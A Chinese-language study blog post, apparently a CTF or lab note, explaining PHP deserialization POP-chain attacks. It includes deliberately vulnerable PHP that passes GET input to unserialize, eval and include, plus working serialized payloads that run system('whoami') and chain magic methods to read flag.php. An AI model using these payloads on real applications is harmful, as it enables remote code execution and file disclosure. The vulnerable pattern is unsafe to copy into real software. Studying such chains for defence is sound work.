@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf8"/>
+    <meta name="viewport" content="initial-scale=1.0, width=device-width"/>
+    <title>
+      
+        4-POP链 | Blanks'Blog
+      
+    </title>
+    <meta name="description" content=""/>
+    <meta name="keywords" content=""/>
+    
+      <link rel="apple-touch-icon"
+            sizes="180x180"
+            href="/images/apple-touch-icon.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="32x32"
+            href="/images/favicon-32x32.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="16x16"
+            href="/images/favicon-16x16.png"/>
+    
+    
+      <link rel="mask-icon"
+            href="/images/logo.svg"
+            color=""/>
+    
+    
+    
+      
+  <style>
+    @font-face {
+        font-family:sourceHanSerif;
+        src: url(/font/regular.ttf);
+        font-weight: regular;
+    }
+  </style>
+
+  <style>
+    @font-face {
+        font-family:sourceHanSerif;
+        src: url(/font/bold.ttf);
+        font-weight: bold;
+    }
+  </style>
+
+
+    
+    <link rel="stylesheet"
+          type="text/css"
+          href='/css/layout.css'/>
+    
+    
+  <link rel="stylesheet" type="text/css" href="/css/post.css" />
+  
+
+  <meta name="generator" content="Hexo 6.3.0"></head>
+  <body>
+    <div class="head">
+      <div class="nav">
+        <a href='/' class="nav-logo">
+          <img alt="logo" height="60px" width="60px" src="/images/logo.svg"/>
+        </a>
+        <input id="navBtn" type="checkbox"/>
+        <div class="nav-menu">
+          
+            
+              <a class="nav-menu-item" href="/%E5%AD%A6%E4%B9%A0">Notes</a>
+            
+          
+          
+        </div>
+        <label class="nav-btn" for="navBtn"></label>
+      </div>
+    </div>
+    <div class="body">
+      
+  <article class="post-content">
+    <div class="post-inner--toc">
+      <div class="post-content__head">
+        <div class="post-title">4-POP链</div>
+        <div class="post-info">
+          
+  <a href="/tags/php-pop%E9%93%BE/" class="post-tag">#php pop链</a>
+
+
+          <span class="post-date">2023-03-22</span>
+        </div>
+      </div>
+      
+        <aside class="toc-outer">
+          <div class="toc-title">目录</div>
+          <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">POP链前置知识 成员属性赋值对象</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">反推法</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">构造payload</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">魔术方法触发规则</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">POP链构造 — POC 编写</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">POP链</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">例题 ：</span></a></li></ol></li></ol>
+          <a href="#" class="toc-top">回到顶部</a>
+        </aside>
+      
+      <div class="post-content__body">
+        
+          <div class="post-gallery">
+            
+          </div>
+        
+        <meta name="referrer" content="no-referrer">
+
+
+<p><a name="Ej6zX"></a></p>
+<h1><span id="pop链前置知识-成员属性赋值对象">POP链前置知识 成员属性赋值对象</span></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">index</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;test = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">normal</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;test-&gt;<span class="hljs-title function_ invoke__">action</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">normal</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;please attack me&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$test2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;test2);<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;test&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>?1 : 如何控制你的对象里的成员属性的对象是那一个 ？<br>?2: 学习使用反推法  </p>
+<p><a name="ZUBEk"></a></p>
+<h2><span id="反推法">反推法</span></h2><p>找到可以利用的点 ，可以执行命令的函数 </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$test2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;test2);<br>    &#125;<br></code></pre></td></tr></table></figure>
+<p>1 ： evil 类 ，里面可以执行命令 <br>可以利用的漏洞点在函数eval() (可执行命令 )<br>2： eval() 会调用 $test2<br>3: 往上找 看谁会去调用 action方法 ，因为这里也不存在魔术方法，不会凭空调用$test2 ，action；</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">index</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;test = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">normal</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;test-&gt;<span class="hljs-title function_ invoke__">action</span>();<br>    &#125;<br>  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">normal</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;please attack me&quot;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>
+<p>4 :  发现__destruct()方法， <br>析构函数，在对象的所有引用被删除或者当对象被显式销毁时执行的魔术方法。<br>反序列化unserialize() 触发魔术方法destruct ,<br> __destruct 会从$test调用action() ,但是这里调用的是 class normal 类 </p>
+<p>思路 ：</p>
+<blockquote>
+<p>unserialize($_GET[‘test’]);</p>
+</blockquote>
+<p>一定会触发 __destruct()魔法函数 ，然后去调用 action ,但是 他这里调用的class normal 里面的 action(),<br>然后就是要修改 ，序列化内容 ，让 normal 变成我们想要调用的 calss evil 类里面的action() 方法</p>
+<p>思考点 ：<br>如何让$test 调用 evil里的成员方法 action（）</p>
+<p>解决思路 ： <br>反序列化 成员属性的值，是由我们反序列化字符串的值来决定 的 <br>只需要给 $test 赋值为对象 test &#x3D; new evil() </p>
+<p><a name="L6W1S"></a></p>
+<h2><span id="构造payload">构造payload</span></h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679453027034-2a65e184-77a7-451e-8476-c2279af05c41.png#averageHue=%231f1f1e&clientId=uc1a5ce96-14d2-4&from=paste&height=876&id=u7a0de6f0&name=image.png&originHeight=876&originWidth=958&originalType=binary&ratio=1&rotation=0&showTitle=false&size=75444&status=done&style=none&taskId=u61fd9ce3-ec0c-43c0-9fb3-c294b759f73&title=&width=958" alt="image.png"><br>然后输出 payload ：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679453010534-a712a592-3401-435c-83a8-ef5e9f28de00.png#averageHue=%23fcfaf9&clientId=uc1a5ce96-14d2-4&from=paste&height=157&id=u65e1180c&name=image.png&originHeight=157&originWidth=1745&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15994&status=done&style=none&taskId=u372c3983-e173-4442-a484-b8bfe5499c1&title=&width=1745" alt="image.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">urlencode 编码过的<br>O%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>index%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A11%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>index%<span class="hljs-number">00</span>test%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>evil%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>test2%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A17%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>system%<span class="hljs-number">28</span>%<span class="hljs-number">27</span>whoami%<span class="hljs-number">27</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D<br><br>  <br>O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;index&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;indextest&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;evil&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;test2&quot;</span>;s:<span class="hljs-number">17</span>:<span class="hljs-string">&quot;system(&#x27;whoami&#x27;);&quot;</span>;&#125;&#125;<br></code></pre></td></tr></table></figure>
+<p>是可以成功执行的<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679452972940-828c904e-6193-4f27-a71b-69d1398720b7.png#averageHue=%23d0d0d0&clientId=uc1a5ce96-14d2-4&from=paste&height=901&id=u7bafe8ba&name=image.png&originHeight=901&originWidth=1777&originalType=binary&ratio=1&rotation=0&showTitle=false&size=53750&status=done&style=none&taskId=ua3a1c245-ca16-495d-a315-b04b6745145&title=&width=1777" alt="image.png"></p>
+<p><a name="SdCsb"></a></p>
+<h1><span id="魔术方法触发规则">魔术方法触发规则</span></h1><p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679453805744-76717a9e-b5ac-4342-9ff5-a590e082904f.png#averageHue=%23efdad6&clientId=uc1a5ce96-14d2-4&from=paste&height=679&id=uc1be57ed&name=image.png&originHeight=679&originWidth=1392&originalType=binary&ratio=1&rotation=0&showTitle=false&size=618683&status=done&style=none&taskId=u7a72b84e-dd2f-463f-b5cf-8579f6ce020&title=&width=1392" alt="image.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">fast</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;wakeup is here!!&quot;</span>;<br>        <span class="hljs-keyword">echo</span>  <span class="hljs-variable language_">$this</span>-&gt;source;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">sec</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$benben</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;tostring is here!!&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;benben&#x27;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>魔术方法触发前提:魔术方法所在类(或对象)被调用<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679454920944-0cb91310-1902-40c1-97ad-2a3fed1cca7c.png#averageHue=%231f1e1e&clientId=uc1a5ce96-14d2-4&from=paste&height=556&id=u27ac867c&name=image.png&originHeight=556&originWidth=1006&originalType=binary&ratio=1&rotation=0&showTitle=false&size=42445&status=done&style=none&taskId=u94f8614a-0075-4635-a2c1-bf22f6bbcf8&title=&width=1006" alt="image.png"><br>看靶场 我这里会报类型错误<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679455006396-ae0e129b-09c1-4f66-a6da-5537e6b3adde.png#averageHue=%23d7d7d7&clientId=uc1a5ce96-14d2-4&from=paste&height=836&id=u0d29d9ea&name=image.png&originHeight=836&originWidth=1052&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36113&status=done&style=none&taskId=ubbe58766-7f23-4d2d-a835-ac53f9cf991&title=&width=1052" alt="image.png"><br>都是不会触发的 ，因为不包含wakeup(),故不会触发<br>没有字符串输出 unserialize ， benben传的值 ，所以不会触发 ，<br>本地echo 输出 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679455129663-2ad8b4c7-aad2-4573-b2ec-deb25a1032bf.png#averageHue=%23ada49a&clientId=uc1a5ce96-14d2-4&from=paste&height=694&id=u89a9a277&name=image.png&originHeight=694&originWidth=1387&originalType=binary&ratio=1&rotation=0&showTitle=false&size=81642&status=done&style=none&taskId=u99945a1a-8c84-457f-860a-7378c89aff3&title=&width=1387" alt="image.png"><br>是可以触发 __tostring()<br>但是这题要求触发两个 魔法方法怎么触发呢</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">fast</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">sec</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$benben</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">sec</span>();  <br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">fast</span>();<br><span class="hljs-comment">//new 两个实例化 </span><br><br><span class="hljs-variable">$b</span> -&gt; source=<span class="hljs-variable">$a</span>; <br><span class="hljs-comment">// 把$a 对象 赋值给 fast 的  source 触发 wakeup 方法 </span><br><span class="hljs-comment">//反序列化之后会触发</span><br><span class="hljs-comment">//echo  __tostring方法</span><br><span class="hljs-keyword">echo</span>  <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>); <br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><code>O:4:&quot;fast&quot;:1:&#123;s:6:&quot;source&quot;;O:3:&quot;sec&quot;:1:&#123;s:6:&quot;benben&quot;;N;&#125;&#125;</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679456214062-a97f20eb-1a83-49e9-bc27-5776dc508c84.png#averageHue=%23d7d7d7&clientId=uc1a5ce96-14d2-4&from=paste&height=840&id=u2e9c73f2&name=image.png&originHeight=840&originWidth=1486&originalType=binary&ratio=1&rotation=0&showTitle=false&size=40560&status=done&style=none&taskId=ud1fab80b-75bf-490c-9000-0922cac690e&title=&width=1486" alt="image.png"></p>
+<p><a name="BPS4q"></a></p>
+<h1><span id="pop链构造-poc-编写">POP链构造 — POC 编写</span></h1><p><a name="Z0jYe"></a></p>
+<h2><span id="pop链">POP链</span></h2><blockquote>
+<p>在反序列化中，我们能控制的数据就是对象中的属性值(成员变量)，所以在PHP反序列化中有一种漏洞利用方法叫”面向属性编程”，</p>
+</blockquote>
+<blockquote>
+<p>即POP( Property Oriented Programming)。<br>POP链就是利用魔法方法在里面进行多次跳转然后获取敏感数据的一种payload。</p>
+</blockquote>
+<p><a name="Qcfmm"></a></p>
+<h2><span id="例题">例题 ：</span></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag is in flag.php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;str-&gt;source;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;source;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2023/jpeg/22356351/1679459677952-c98013e4-0d75-4759-b471-fb260db48e4a.jpeg"></p>
+<p><strong>POC ：</strong><br><strong>先把 function 全部去掉 只留需要赋值 的</strong><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679459777504-5b66f456-2edd-4687-81d2-8483e284f278.png#averageHue=%231e1e1e&clientId=uc1a5ce96-14d2-4&from=paste&height=429&id=u6c254ea9&name=image.png&originHeight=429&originWidth=511&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19732&status=done&style=none&taskId=uadae4f47-7f8b-4bce-9db0-04af53e1348&title=&width=511" alt="image.png"></p>
+<p>完整  poc <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679460303119-8839b0a5-32fa-4196-b718-0f5b4de5658d.png#averageHue=%23bca15f&clientId=uc1a5ce96-14d2-4&from=paste&height=878&id=uc36b1c98&name=image.png&originHeight=878&originWidth=1222&originalType=binary&ratio=1&rotation=0&showTitle=false&size=97999&status=done&style=none&taskId=u1272b84d-40fc-43e8-88dd-14d16b92733&title=&width=1222" alt="image.png"><br>这里因为是  private $var  私有的属性 ，要在 Modfier前后加上%00<br>payload:<br><code>?pop=O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;r:1;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:8:&quot;Modifier&quot;:1:&#123;s:13:&quot;%00Modifier%00var&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125;</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679460395121-465a35b1-7e07-4d08-bcaf-fed6f1212362.png#averageHue=%23cfcfcf&clientId=uc1a5ce96-14d2-4&from=paste&height=883&id=u4c065b88&name=image.png&originHeight=883&originWidth=1701&originalType=binary&ratio=1&rotation=0&showTitle=false&size=61231&status=done&style=none&taskId=u9c67a9ad-a145-425d-b657-0cb548ebdb7&title=&width=1701" alt="image.png"><br>成功输出了flag.php</p>
+
+      </div>
+    </div>
+  </article>
+  <div class="post__foot">
+    
+    <div class="post-nav">
+  
+    <a class="post-nav-item-left" href="/2023/03/23/Challenge-11-20/">
+      <div class="text-align">
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+        <span class="text-small">上一篇</span>
+      </div>
+      <div>Challenge-11-20</div>
+    </a>
+  
+  <div class="vhr"></div>
+  
+    <a class="post-nav-item-right" href="/2023/03/22/edusrc%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%8C%96%E6%8E%98%20%EF%BC%88%E5%B7%B2%E4%BF%AE%E5%A4%8D%EF%BC%89/">
+      <div class="text-align">
+        <span class="text-small">下一篇</span>
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             transform="scale(-1,-1)"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+      </div>
+      edusrc信息泄露挖掘
+    </a>
+  
+</div>
+
+    
+      <div class="related-post">
+  <div class="related__head">
+  <a href="/tags/php-pop%E9%93%BE/" class="post-tag">#php pop链</a>
+
+</div>
+  <div class="realated__body">
+    
+      DEBUG: 请安装插件 <a target="_blank" rel="noopener" href="https://github.com/tea3/hexo-related-popular-posts">hexo-related-popular-posts</a> 或关闭 related_post 配置!
+    
+  </div>
+</div>
+
+    
+    
+  </div>
+
+    </div>
+    <div class="foot">
+      <div class="foot-inner">
+        <div class="foot__head">
+          
+            <div class="foot-line">
+              
+                <div class="matts">浮</div>
+              
+                <div class="matts">云</div>
+              
+                <div class="matts">游</div>
+              
+                <div class="matts">子</div>
+              
+                <div class="matts">意</div>
+              
+            </div>
+          
+            <div class="foot-line">
+              
+                <div class="matts">落</div>
+              
+                <div class="matts">日</div>
+              
+                <div class="matts">故</div>
+              
+                <div class="matts">人</div>
+              
+                <div class="matts">情</div>
+              
+            </div>
+          
+        </div>
+        <div class="foot__body">
+          
+          
+            <div class="foot-item">
+              <div class="foot-item__head">账号</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-github.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/x0blank">github</a>
+                  </div>
+                
+              </div>
+            </div>
+          
+          <div class="foot-item">
+            <div class="foot-item__head">联系</div>
+            <div class="foot-item__body">
+              <div class="text">
+                <img alt="link" height="20px" width="20px" src="/images/icon/icon-email.svg"/>
